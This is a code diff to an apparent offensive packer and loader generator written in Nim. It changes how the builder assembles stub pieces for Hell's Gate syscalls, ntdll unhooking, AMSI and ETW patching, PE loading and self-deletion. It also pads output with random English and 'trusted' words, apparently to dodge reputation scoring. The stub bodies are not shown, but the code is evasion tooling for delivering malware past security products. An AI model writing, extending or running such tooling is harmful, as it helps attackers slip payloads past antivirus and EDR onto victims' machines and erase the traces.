@@ -577,6 +577,7 @@ proc genEnglishwords (nuofWords: int): string =
 var {rand2} = {rand1}
 
 """
+  return englishwordsstub
 
 proc genTrustedwords (nuofWords: int): string =
 
@@ -612,17 +613,20 @@ var {rand2} = {rand1}
   return trustedwordsstub
 
 var stub = Cryptstub1
-
+stub.add(DInvokeBaseStub)
 if(pump):
     # makes no sense to import strenc when strings should be visible in the binary.
     stub =  stub.replace("import strenc", "")
     for m in pumpargs:
         if(m == "words"):
+            echo "[*] Adding words"
             stub.add(genEnglishwords(rand(4750..7800)))
         if (m == "reputation"):
+            echo "[*] Adding reputation"
             stub.add(genTrustedwords(rand(3500..6200)))
 
 if (selfdelete):
+    stub.add(DInvokeLoadLibraryAGetProcAddress)
     stub.add(DInvokeSelfDeleteStubs)
     stub.add(FileDeleteStub)
 
@@ -655,7 +659,6 @@ if(unhook):
         stub.add(HellsgateNtCloseDelegate)
         stub.add(HellsgateUnhookStub)
     else:
-        stub.add(DInvokeBaseStub)
         stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(GetSyscallStub)
@@ -673,7 +676,8 @@ if (remoteETWpatch or remoteAMSIpatch):
     stub.add(RemoteModuleHandleStub)
 
 if (AMSI or ETW or peload or (localinject == false)):
-    stub.add(DInvokeLoadLibraryAGetProcAddress)
+    if ("LoadLibraryA_t* = proc" in stub) == false:
+        stub.add(DInvokeLoadLibraryAGetProcAddress)
 
 if (hellsgate):
     if ("OpenProcess_HASH * = 3768626" in stub) == false:
@@ -753,9 +757,6 @@ if (hellsgate):
             stub.add(LoadAssemblyStub)
             stub.add(LoadAssemblyStubArgs)
         csharp = false
-else:
-    if ("VirtualAllocEx_HASH * = 3748893108" in stub) == false:
-        stub.add(DInvokeBaseStub)
 if (peload):
     if ("PS_ATTR_UNION" in stub) == false:
         stub.add(GetSyscallStub)
